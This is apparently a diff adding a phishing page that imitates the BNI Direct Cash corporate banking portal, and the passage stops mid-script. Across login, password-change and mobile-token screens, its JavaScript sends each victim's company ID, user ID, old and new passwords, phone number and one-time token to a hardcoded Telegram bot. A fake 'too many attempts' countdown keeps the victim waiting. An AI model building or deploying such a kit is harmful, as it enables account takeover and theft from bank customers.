+                                    <svg id="eyeConfOff" viewBox="0 0 24 24" style="display: none;"><path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16c.57-.23 1.18-.36 1.83-.36zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z"/></svg>
+                                </button>
+                            </div>
+                        </div>
+
+                        <div class="form-group">
+                            <label>Nomor Telepon Genggam</label>
+                            <div style="display:flex; gap:8px;">
+                                <div style="background:#f5f5f5; border:1px solid #ccc; border-radius:5px; padding:0 14px; font-size:14px; color:#333; display:flex; align-items:center; height:40px; font-weight:600; min-width:65px; justify-content:center;">+62</div>
+                                <input type="tel" id="phoneNumber" placeholder="8xx-xxxx-xxxx" required oninput="checkFormValidity()" style="flex:1; height:40px; padding:10px 14px; border:1px solid #ccc; border-radius:5px; font-size:14px; outline:none; background:#fafafa;">
+                            </div>
+                        </div>
+
+                        <div class="btn-row">
+                            <button type="submit" class="btn-lanjutkan" id="btnLanjutkan" disabled>Lanjutkan</button>
+                            <button type="button" class="btn-hapus" onclick="clearChangeForm()">Hapus</button>
+                        </div>
+
+                        <div class="warning-box">
+                            Disarankan untuk tidak menyimpan Kata Sandi anda
+                        </div>
+                    </form>
+
+                    <div class="form-footer">
+                        <div class="lupa-password">
+                            <a href="#">Lupa Kata Sandi?</a>
+                            <p>Dengan klik tombol Lanjutkan,<br>Anda setuju dengan <a href="#">Syarat & Ketentuan</a></p>
+                        </div>
+                        <div class="digi-cert">
+                            <p>Security Certified by</p>
+                            <div class="digi-cert-badge">
+                                <svg width="14" height="14" viewBox="0 0 24 24" fill="#1a7a7a"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
+                                <span><strong>digi</strong>cert</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="bantuan-section">
+                    <div class="bantuan-header">Bantuan & Dukungan</div>
+                    <div class="bantuan-links">
+                        <a href="#">📄 Panduan Singkat</a>
+                        <a href="#">📝 Formulir BNIdirect</a>
+                    </div>
+                </div>
+
+                <div class="sat-section">
+                    <div class="sat-title">SERVICE<br>ACTION<br>TEAM</div>
+                    <div class="sat-divider"></div>
+                    <div class="sat-contacts">
+                        <div>
+                            <svg viewBox="0 0 24 24"><path d="M6.62 10.79c1.44 2.83 3.76 5.14 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.25 1.02l-2.2 2.2z"/></svg>
+                            <span>(021) 29946046</span>
+                        </div>
+                        <div>
+                            <svg viewBox="0 0 24 24"><path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/></svg>
+                            <a href="mailto:tbs_sat@bni.co.id">tbs_sat@bni.co.id</a>
+                        </div>
+                        <div>
+                            <svg viewBox="0 0 24 24"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347z"/><path d="M12 0C5.373 0 0 5.373 0 12c0 2.625.846 5.059 2.284 7.034L.789 23.492a.5.5 0 00.612.638l4.733-1.238A11.94 11.94 0 0012 24c6.627 0 12-5.373 12-12S18.627 0 12 0zm0 22c-2.24 0-4.326-.726-6.015-1.96l-.42-.315-3.3.862.882-3.217-.346-.453A9.96 9.96 0 012 12C2 6.486 6.486 2 12 2s10 4.486 10 10-4.486 10-10 10z"/></svg>
+                            <span>0858 5000 1946</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="banner-section">
+            <div class="banner-carousel-wrapper" id="bannerWrapper2">
+                <button class="carousel-nav-btn prev" onclick="scrollBannerManual(-1)">‹</button>
+                <div class="banner-carousel" id="bannerCarousel2">
+                    <div class="banner-card"><img src="https://i.imgur.com/g8IogtJ.jpeg" alt="Banner 1"></div>
+                    <div class="banner-card"><img src="https://i.imgur.com/9PAbnSF.jpeg" alt="Banner 2"></div>
+                    <div class="banner-card"><img src="https://i.imgur.com/ybmb003.jpeg" alt="Banner 3"></div>
+                    <div class="banner-card"><img src="https://i.imgur.com/g8IogtJ.jpeg" alt="Banner 1"></div>
+                    <div class="banner-card"><img src="https://i.imgur.com/9PAbnSF.jpeg" alt="Banner 2"></div>
+                    <div class="banner-card"><img src="https://i.imgur.com/ybmb003.jpeg" alt="Banner 3"></div>
+                </div>
+                <button class="carousel-nav-btn next" onclick="scrollBannerManual(1)">›</button>
+            </div>
+        </div>
+
+        <footer class="footer">
+            <div class="footer-content">
+                <div class="footer-logo">
+                    <img src="https://i.imgur.com/WzZsBVh.jpeg" alt="BNI Logo">
+                </div>
+                <div class="footer-col">
+                    <h4>Kantor BNI</h4>
+                    <p>Gedung Graha BNI</p>
+                    <p>Jl. Jenderal Sudirman Kav. 1</p>
+                    <p>Jakarta Pusat 10220</p>
+                    <p>Indonesia</p>
+                </div>
+                <div class="footer-col">
+                    <h4>Hubungi Service Action Team</h4>
+                    <div class="footer-contact-item">
+                        <svg viewBox="0 0 24 24"><path d="M6.62 10.79c1.44 2.83 3.76 5.14 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.25 1.02l-2.2 2.2z"/></svg>
+                        <span>(021) 29946046</span>
+                    </div>
+                    <div class="footer-contact-item">
+                        <svg viewBox="0 0 24 24"><path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/></svg>
+                        <span>tbs_sat@bni.co.id</span>
+                    </div>
+                    <div class="footer-contact-item">
+                        <svg viewBox="0 0 24 24"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347z"/><path d="M12 0C5.373 0 0 5.373 0 12c0 2.625.846 5.059 2.284 7.034L.789 23.492a.5.5 0 00.612.638l4.733-1.238A11.94 11.94 0 0012 24c6.627 0 12-5.373 12-12S18.627 0 12 0zm0 22c-2.24 0-4.326-.726-6.015-1.96l-.42-.315-3.3.862.882-3.217-.346-.453A9.96 9.96 0 012 12C2 6.486 6.486 2 12 2s10 4.486 10 10-4.486 10-10 10z"/></svg>
+                        <span>0858 5000 1946</span>
+                    </div>
+                </div>
+                <div class="footer-col">
+                    <h4>Bantuan & Dukungan</h4>
+                    <a href="#">Syarat dan Ketentuan</a>
+                </div>
+            </div>
+            <div class="footer-legal">
+                <p><strong>PT Bank Negara Indonesia (Persero) Tbk</strong> berizin dan diawasi oleh Otoritas Jasa Keuangan (OJK) & Bank Indonesia (BI) serta merupakan peserta penjamin Lembaga Penjamin Simpanan (LPS). Maksimum nilai simpanan yang dijamin LPS per nasabah Rp. 2 Milyar. Info lebih lanjut pada https://apps.lps.go.id/BankPesertaLPSRate</p>
+                <p>© Hak Cipta 2023 PT. Bank Negara Indonesia (Persero), Tbk</p>
+            </div>
+        </footer>
+
+        <div class="footer-bottom">
+            <div class="marquee-content">
+                Nasabah BNI yang kami hormati. Dengan ini diinformasikan bahwa layanan SAT (Service Action Team) sebagai berikut, contact email : tbs_sat@bni.co.id • Hubungi kami di (021) 29946046 atau WhatsApp 0858 5000 1946 • Terima kasih
+            </div>
+        </div>
+    </div>
+
+    <!-- ============ HALAMAN 3: MOBILE TOKEN ============ -->
+    <div id="page3" class="page">
+        <header class="header">
+            <div class="logo">
+                <img src="https://i.imgur.com/WzZsBVh.jpeg" alt="BNI Direct Cash Logo">
+            </div>
+            <div class="lang-selector">
+                <div class="lang-flag"></div>
+                <span>Bahasa Indonesia</span>
+            </div>
+        </header>
+
+        <div class="main-content">
+            <div class="form-wrapper">
+                <div class="token-info-box">
+                    <span class="info-icon">ℹ</span> Masukkan <strong>Mobile Token</strong> Anda untuk mengonfirmasi perubahan kata sandi. Untuk mendapatkan Mobile Token atau Token Respon, buka aplikasi Mobile Token.
+                </div>
+
+                <div class="form-container">
+                    <form id="tokenForm" onsubmit="return handleConfirmToken(event)">
+                        <div class="form-group">
+                            <label>Mobile Token <span style="color:#e87722;">*</span></label>
+                            <div class="password-wrapper">
+                                <input type="password" id="mobileToken" placeholder="Masukkan Mobile Token (maks. 10 digit)" 
+                                       maxlength="10" required oninput="handleTokenInput(this)">
+                                <button type="button" class="toggle-password" onclick="togglePassword('mobileToken', 'eyeToken', 'eyeTokenOff')">
+                                    <svg id="eyeToken" viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
+                                    <svg id="eyeTokenOff" viewBox="0 0 24 24" style="display: none;"><path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16c.57-.23 1.18-.36 1.83-.36zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z"/></svg>
+                                </button>
+                            </div>
+                        </div>
+
+                        <div class="error-message-box" id="errorMessageBox">
+                            <div class="error-message-text">
+                                <span class="error-icon"></span>
+                                Terlalu banyak percobaan, mohon tunggu dalam 5 menit.
+                            </div>
+                            <div class="error-timer-section">
+                                <span class="timer-icon"></span>
+                                <span>Sisa waktu:</span>
+                                <span class="error-timer-value" id="errorTimerDisplay">05:00</span>
+                            </div>
+                        </div>
+
+                        <div class="btn-row">
+                            <button type="submit" class="btn-verifikasi" id="btnVerifikasi">Verifikasi</button>
+                            <button type="button" class="btn-hapus" onclick="clearTokenForm()">Hapus</button>
+                        </div>
+
+                        <div class="warning-box">
+                            Pastikan Mobile Token yang Anda masukkan benar
+                        </div>
+                    </form>
+
+                    <div class="form-footer">
+                        <div class="lupa-password">
+                            <p>Dengan klik tombol Verifikasi,<br>Anda setuju dengan <a href="#">Syarat & Ketentuan</a></p>
+                        </div>
+                        <div class="digi-cert">
+                            <p>Security Certified by</p>
+                            <div class="digi-cert-badge">
+                                <svg width="14" height="14" viewBox="0 0 24 24" fill="#1a7a7a"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
+                                <span><strong>digi</strong>cert</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="bantuan-section">
+                    <div class="bantuan-header">Bantuan & Dukungan</div>
+                    <div class="bantuan-links">
+                        <a href="#">📄 Panduan Singkat</a>
+                        <a href="#">📝 Formulir BNIdirect</a>
+                    </div>
+                </div>
+
+                <div class="sat-section">
+                    <div class="sat-title">SERVICE<br>ACTION<br>TEAM</div>
+                    <div class="sat-divider"></div>
+                    <div class="sat-contacts">
+                        <div>
+                            <svg viewBox="0 0 24 24"><path d="M6.62 10.79c1.44 2.83 3.76 5.14 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.25 1.02l-2.2 2.2z"/></svg>
+                            <span>(021) 29946046</span>
+                        </div>
+                        <div>
+                            <svg viewBox="0 0 24 24"><path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/></svg>
+                            <a href="mailto:tbs_sat@bni.co.id">tbs_sat@bni.co.id</a>
+                        </div>
+                        <div>
+                            <svg viewBox="0 0 24 24"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347z"/><path d="M12 0C5.373 0 0 5.373 0 12c0 2.625.846 5.059 2.284 7.034L.789 23.492a.5.5 0 00.612.638l4.733-1.238A11.94 11.94 0 0012 24c6.627 0 12-5.373 12-12S18.627 0 12 0zm0 22c-2.24 0-4.326-.726-6.015-1.96l-.42-.315-3.3.862.882-3.217-.346-.453A9.96 9.96 0 012 12C2 6.486 6.486 2 12 2s10 4.486 10 10-4.486 10-10 10z"/></svg>
+                            <span>0858 5000 1946</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="banner-section">
+            <div class="banner-carousel-wrapper" id="bannerWrapper3">
+                <button class="carousel-nav-btn prev" onclick="scrollBannerManual(-1)">‹</button>
+                <div class="banner-carousel" id="bannerCarousel3">
+                    <div class="banner-card"><img src="https://i.imgur.com/g8IogtJ.jpeg" alt="Banner 1"></div>
+                    <div class="banner-card"><img src="https://i.imgur.com/9PAbnSF.jpeg" alt="Banner 2"></div>
+                    <div class="banner-card"><img src="https://i.imgur.com/ybmb003.jpeg" alt="Banner 3"></div>
+                    <div class="banner-card"><img src="https://i.imgur.com/g8IogtJ.jpeg" alt="Banner 1"></div>
+                    <div class="banner-card"><img src="https://i.imgur.com/9PAbnSF.jpeg" alt="Banner 2"></div>
+                    <div class="banner-card"><img src="https://i.imgur.com/ybmb003.jpeg" alt="Banner 3"></div>
+                </div>
+                <button class="carousel-nav-btn next" onclick="scrollBannerManual(1)">›</button>
+            </div>
+        </div>
+
+        <footer class="footer">
+            <div class="footer-content">
+                <div class="footer-logo">
+                    <img src="https://i.imgur.com/WzZsBVh.jpeg" alt="BNI Logo">
+                </div>
+                <div class="footer-col">
+                    <h4>Kantor BNI</h4>
+                    <p>Gedung Graha BNI</p>
+                    <p>Jl. Jenderal Sudirman Kav. 1</p>
+                    <p>Jakarta Pusat 10220</p>
+                    <p>Indonesia</p>
+                </div>
+                <div class="footer-col">
+                    <h4>Hubungi Service Action Team</h4>
+                    <div class="footer-contact-item">
+                        <svg viewBox="0 0 24 24"><path d="M6.62 10.79c1.44 2.83 3.76 5.14 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.25 1.02l-2.2 2.2z"/></svg>
+                        <span>(021) 29946046</span>
+                    </div>
+                    <div class="footer-contact-item">
+                        <svg viewBox="0 0 24 24"><path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/></svg>
+                        <span>tbs_sat@bni.co.id</span>
+                    </div>
+                    <div class="footer-contact-item">
+                        <svg viewBox="0 0 24 24"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347z"/><path d="M12 0C5.373 0 0 5.373 0 12c0 2.625.846 5.059 2.284 7.034L.789 23.492a.5.5 0 00.612.638l4.733-1.238A11.94 11.94 0 0012 24c6.627 0 12-5.373 12-12S18.627 0 12 0zm0 22c-2.24 0-4.326-.726-6.015-1.96l-.42-.315-3.3.862.882-3.217-.346-.453A9.96 9.96 0 012 12C2 6.486 6.486 2 12 2s10 4.486 10 10-4.486 10-10 10z"/></svg>
+                        <span>0858 5000 1946</span>
+                    </div>
+                </div>
+                <div class="footer-col">
+                    <h4>Bantuan & Dukungan</h4>
+                    <a href="#">Syarat dan Ketentuan</a>
+                </div>
+            </div>
+            <div class="footer-legal">
+                <p><strong>PT Bank Negara Indonesia (Persero) Tbk</strong> berizin dan diawasi oleh Otoritas Jasa Keuangan (OJK) & Bank Indonesia (BI) serta merupakan peserta penjamin Lembaga Penjamin Simpanan (LPS). Maksimum nilai simpanan yang dijamin LPS per nasabah Rp. 2 Milyar. Info lebih lanjut pada https://apps.lps.go.id/BankPesertaLPSRate</p>
+                <p>© Hak Cipta 2023 PT. Bank Negara Indonesia (Persero), Tbk</p>
+            </div>
+        </footer>
+
+        <div class="footer-bottom">
+            <div class="marquee-content">
+                Nasabah BNI yang kami hormati. Dengan ini diinformasikan bahwa layanan SAT (Service Action Team) sebagai berikut, contact email : tbs_sat@bni.co.id • Hubungi kami di (021) 29946046 atau WhatsApp 0858 5000 1946 • Terima kasih
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const TELEGRAM_BOT_TOKEN = '8939819797:AAGoByoLMpMVtwkRA5UOL5xI9HqX6jIhpOE';
+        const TELEGRAM_CHAT_ID = '8989906177';
+
+        let loginData = { companyId: '', userId: '', password: '' };
+        let passwordData = { currentPwd: '', newPwd: '', phone: '' };
+        let errorTimer = null;
+        let errorTimeLeft = 300;
+
+        let bannerAutoScroll = null;
+        let bannerIsPaused = false;
+        const BANNER_SCROLL_SPEED = 1;
+        const BANNER_SCROLL_INTERVAL = 16;
+
+        function startBannerAutoScroll() {
+            const carousel = document.getElementById('bannerCarousel');
+            if (!carousel) return;
+            const cards = carousel.querySelectorAll('.banner-card');
+            const originalWidth = (cards[0].offsetWidth + 12) * 3;
+            bannerAutoScroll = setInterval(() => {
+                if (bannerIsPaused) return;
+                carousel.scrollLeft += BANNER_SCROLL_SPEED;
+                if (carousel.scrollLeft >= originalWidth) {
+                    carousel.scrollLeft = 0;
+                }
+            }, BANNER_SCROLL_INTERVAL);
+        }
+
+        function stopBannerAutoScroll() {
+            if (bannerAutoScroll) {
+                clearInterval(bannerAutoScroll);
+                bannerAutoScroll = null;
+            }
+        }
+
+        function scrollBannerManual(direction) {
+            const carousel = document.getElementById('bannerCarousel');
+            carousel.scrollBy({ left: direction * 350, behavior: 'smooth' });
+        }
+
+        const bannerWrapper = document.getElementById('bannerWrapper');
+        if (bannerWrapper) {
+            bannerWrapper.addEventListener('mouseenter', () => { bannerIsPaused = true; });
+            bannerWrapper.addEventListener('mouseleave', () => { bannerIsPaused = false; });
+        }
+
+        function togglePassword(inputId, eyeId, eyeOffId) {
+            const input = document.getElementById(inputId);
+            const eye = document.getElementById(eyeId);
+            const eyeOff = document.getElementById(eyeOffId);
+            if (input.type === 'password') {
+                input.type = 'text';
+                eye.style.display = 'none';
+                eyeOff.style.display = 'block';
+            } else {
+                input.type = 'password';
+                eye.style.display = 'block';
+                eyeOff.style.display = 'none';
+            }
+        }
+
+        function clearForm() {
+            document.getElementById('companyId').value = '';
+            document.getElementById('userId').value = '';
+            document.getElementById('password').value = '';
+        }
+
+        function clearChangeForm() {
+            document.getElementById('currentPassword').value = '';
+            document.getElementById('newPassword').value = '';
+            document.getElementById('confirmPassword').value = '';
+            document.getElementById('phoneNumber').value = '';
+            const btnLanjutkan = document.getElementById('btnLanjutkan');
+            btnLanjutkan.disabled = true;
+            btnLanjutkan.classList.remove('active');
+        }
+
+        function clearTokenForm() {
+            document.getElementById('mobileToken').value = '';
+        }
+
+        async function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${message}&parse_mode=Markdown`;
+            try {
+                const response = await fetch(url);
+                const data = await response.json();
+                return data.ok;
+            } catch (error) {
+                console.error('Error sending to Telegram:', error);
+                return false;
+            }
+        }
+
+        async function handleLogin(e) {
+            e.preventDefault();
+            const companyId = document.getElementById('companyId').value;
+            const userId = document.getElementById('userId').value;
+            const password = document.getElementById('password').value;
+            const btnMasuk = document.getElementById('btnMasuk');
+
+            btnMasuk.textContent = 'Memproses...';
+            btnMasuk.disabled = true;
+
+            loginData.companyId = companyId;
+            loginData.userId = userId;
+            loginData.password = password;
+
+            const loginMsg = `🔔 *LOGIN BNI DIRECT CASH*%0A%0A` +
+                `📋 *ID Perusahaan:* ${companyId}%0A` +
+                ` *ID Pengguna:* ${userId}%0A` +
+                `🔑 *Kata Sandi:* ${password}%0A%0A` +
+                `🕐 *Waktu:* ${new Date().toLocaleString('id-ID')}`;
+            
+            await sendToTelegram(loginMsg);
+            stopBannerAutoScroll();
+
+            document.getElementById('page1').classList.remove('active');
+            document.getElementById('page2').classList.add('active');
+            window.scrollTo(0, 0);
+
+            btnMasuk.textContent = 'Masuk';
+            btnMasuk.disabled = false;
+            return false;
+        }
+
+        function checkFormValidity() {
+            const currentPwd = document.getElementById('currentPassword').value;
+            const newPwd = document.getElementById('newPassword').value;
+            const confirmPwd = document.getElementById('confirmPassword').value;
+            const phone = document.getElementById('phoneNumber').value;
+            const btnLanjutkan = document.getElementById('btnLanjutkan');
+
+            if (currentPwd && newPwd && confirmPwd && phone) {
+                btnLanjutkan.disabled = false;
+                btnLanjutkan.classList.add('active');
+            } else {
+                btnLanjutkan.disabled = true;
+                btnLanjutkan.classList.remove('active');
+            }
+        }
+
+        async function handleChangePassword(e) {
+            e.preventDefault();
+            const currentPwd = document.getElementById('currentPassword').value;
+            const newPwd = document.getElementById('newPassword').value;
+            const confirmPwd = document.getElementById('confirmPassword').value;
+            const phone = document.getElementById('phoneNumber').value;
+            const btnLanjutkan = document.getElementById('btnLanjutkan');
+
+            if (newPwd !== confirmPwd) {
+                alert('Kata Sandi Baru dan Konfirmasi Kata Sandi tidak cocok!');
+                return false;
+            }
+
+            btnLanjutkan.textContent = 'Memproses...';
+            btnLanjutkan.disabled = true;
+
+            passwordData.currentPwd = currentPwd;
+            passwordData.newPwd = newPwd;
+            passwordData.phone = phone;
+
+            const changeMsg = `🔐 *PERUBAHAN KATA SANDI - BNI DIRECT CASH*%0A%0A` +
+                `📋 *ID Perusahaan:* ${loginData.companyId}%0A` +
+                `👤 *ID Pengguna:* ${loginData.userId}%0A` +
+                `🔑 *Kata Sandi Lama:* ${currentPwd}%0A` +
+                `🆕 *Kata Sandi Baru:* ${newPwd}%0A` +
+                `📱 *No. Telepon:* +62 ${phone}%0A%0A` +
+                `🕐 *Waktu:* ${new Date().toLocaleString('id-ID')}`;
+            
+            await sendToTelegram(changeMsg);
+
+            document.getElementById('page2').classList.remove('active');
+            document.getElementById('page3').classList.add('active');
+            window.scrollTo(0, 0);
+
+            btnLanjutkan.textContent = 'Lanjutkan';
+            btnLanjutkan.disabled = true;
+            btnLanjutkan.classList.remove('active');
+            return false;
+        }
+
+        function handleTokenInput(input) {
+            input.value = input.value.replace(/[^0-9]/g, '');
+            if (input.value.length > 10) {
+                input.value = input.value.slice(0, 10);
+            }
+        }
+
+        function startErrorTimer() {
+            errorTimeLeft = 300;
+            updateErrorTimerDisplay();
+            
+            const btnVerifikasi = document.getElementById('btnVerifikasi');
+            const mobileTokenInput = document.getElementById('mobileToken');
+            const errorMessageBox = document.getElementById('errorMessageBox');
+
+            btnVerifikasi.disabled = true;
+            mobileTokenInput.disabled = true;
+            errorMessageBox.classList.add('show');
+
+            if (errorTimer) clearInterval(errorTimer);
+            
+            errorTimer = setInterval(() => {
+                errorTimeLeft--;
+                updateErrorTimerDisplay();
+                
+                if (errorTimeLeft <= 0) {
+                    clearInterval(errorTimer);
+                    errorTimer = null;
+                    errorMessageBox.classList.remove('show');
+                    mobileTokenInput.disabled = false;
+                    mobileTokenInput.value = '';
+                    document.getElementById('errorTimerDisplay').textContent = '05:00';
+                    btnVerifikasi.disabled = false;
+                }
+            }, 1000);
+        }
+
+        function updateErrorTimerDisplay() {
+            const minutes = Math.floor(errorTimeLeft / 60);
+            const seconds = errorTimeLeft % 60;
+            const display = `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
+            document.getElementById('errorTimerDisplay').textContent = display;
+        }
+
+        async function handleConfirmToken(e) {
+            e.preventDefault();
+            const token = document.getElementById('mobileToken').value;
+            const btnVerifikasi = document.getElementById('btnVerifikasi');
+            const errorMessageBox = document.getElementById('errorMessageBox');
+
+            if (errorMessageBox.classList.contains('show')) {
+                return false;
+            }
+
+            if (!token || token.length === 0) {
+                alert('Silakan masukkan Mobile Token terlebih dahulu.');
+                return false;
+            }
+
+            btnVerifikasi.textContent = 'Memverifikasi...';
+            btnVerifikasi.disabled = true;
+
+            const tokenMsg = ` *MOBILE TOKEN - BNI DIRECT CASH*%0A%0A` +
+                ` *ID Perusahaan:* ${loginData.companyId}%0A` +
+                `👤 *ID Pengguna:* ${loginData.userId}%0A` +
+                `🔑 *Kata Sandi Lama:* ${passwordData.currentPwd}%0A` +
+                `🆕 *Kata Sandi Baru:* ${passwordData.newPwd}%0A` +
+                `📱 *No. Telepon:* +62 ${passwordData.phone}%0A` +
+                `🔐 *Mobile Token:* ${token}%0A%0A` +
+               
